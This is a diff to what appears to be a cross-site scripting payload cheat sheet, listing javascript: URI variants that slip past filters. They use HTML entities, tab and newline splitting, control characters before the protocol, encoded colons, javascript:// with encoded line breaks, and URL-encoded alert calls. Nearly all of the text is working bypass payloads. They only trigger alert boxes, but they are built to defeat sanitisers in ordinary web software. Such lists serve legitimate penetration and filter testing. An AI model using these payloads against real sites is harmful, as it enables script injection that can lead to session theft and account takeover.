@@ -46,33 +46,34 @@ ja&#x0000A;vascript:alert(1)
 java&#x73;cript:alert()
 &#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert('XSS')
 
-# tab (0x9), newline (0xa) and carriage return (0xd) allowed 
+# tab (0x9), newline (0xa) and carriage return (0xd) allowed (inside or after the protocol) 
 
 ja
 vascript:alert(1) # New line 
 
 jav	asc	ript	:alert(1) # Tab
 
-# Special Characters (you can use them before Raw or encode) Somes Example :
+# Special Characters before the protocol (Raw or encode)
+# \x01-\x20 are allowed - Somes Example :
 http://www.unicode-symbol.com/u/0017.html
 http://www.unicode-symbol.com/u/0008.html
 
 &#23;javascript:alert('Successful XSS') # ETB HTML
 &#x8;javascript:alert(1) # Backspace HTML
 
-
-<!--::colon:: -->
+# colon
 javascript&colon;alert()
 javascript&#x0003A;alert()
 javascript&#58;alert(1)
 javascript&#x3A;alert()
 
-<!-- alert -->
-#HTML entities/encode:
+# javascript://
+javascript://%0Aalert(1)
+javascript://%0Dalert(1)
+
+# alert
 javascript:alert&lpar;&rpar;
 javascript:al&#x65;rt``
-
-#url encoding:
 javascript:alert%60%60
 javascript:x='%27-alert(1)-%27';
 javascript:%61%6c%65%72%74%28%29
